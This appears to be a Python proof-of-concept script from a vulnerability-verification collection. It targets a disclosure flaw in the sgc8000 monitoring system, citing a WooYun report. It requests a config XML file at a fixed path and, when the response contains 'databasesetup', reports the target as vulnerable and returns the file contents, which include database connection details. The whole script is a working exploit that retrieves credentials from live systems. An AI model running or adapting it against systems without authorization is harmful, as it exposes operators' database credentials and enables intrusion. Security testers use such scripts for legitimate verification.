#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name:  sgc8000 监控系统数据连接信息泄露
referer: http://www.wooyun.org/bugs/wooyun-2015-0135197
author: Lucifer
description: 文件deldata_config.xml中,泄露了数据库连接信息。
'''
import sys
import requests
import warnings
from termcolor import cprint

class sgc8000_deldata_config_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/app/deletessdata/config/deldata_config.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml" and r"databasesetup" in req.text:
                cprint("[+]存在sgc8000 监控系统数据连接信息泄露漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "sgc8000 监控系统数据连接信息泄露", str(payload), req.text
            else:
                cprint("[-]不存在sgc8000_deldata_config_disclosure漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None


if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = sgc8000_deldata_config_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()